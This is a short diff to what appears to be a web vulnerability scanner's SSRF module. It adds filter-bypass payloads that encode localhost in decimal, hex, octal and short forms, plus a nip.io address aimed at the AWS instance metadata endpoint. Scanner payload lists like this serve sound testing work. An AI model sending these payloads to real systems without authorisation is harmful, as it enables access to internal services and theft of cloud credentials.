@@ -17,6 +17,12 @@ const SSRF_PAYLOADS = [
   { payload: "http://[::1]:3000/", name: "IPv6 localhost" },
   { payload: "http://0.0.0.0/", name: "zero address" },
   { payload: "http://localhost/server-status", name: "Apache server-status" },
+  // Filter bypass variants
+  { payload: "http://2130706433/", name: "localhost" }, // 127.0.0.1 as decimal
+  { payload: "http://0x7f000001/", name: "localhost" }, // 127.0.0.1 as hex
+  { payload: "http://017700000001/", name: "localhost" }, // 127.0.0.1 as octal
+  { payload: "http://127.1/", name: "localhost" }, // shortened localhost
+  { payload: "http://169.254.169.254.nip.io/latest/meta-data/", name: "AWS metadata" }, // DNS rebinding via nip.io
 ];
 
 export const ssrfModule: ScanModule = async (target) => {
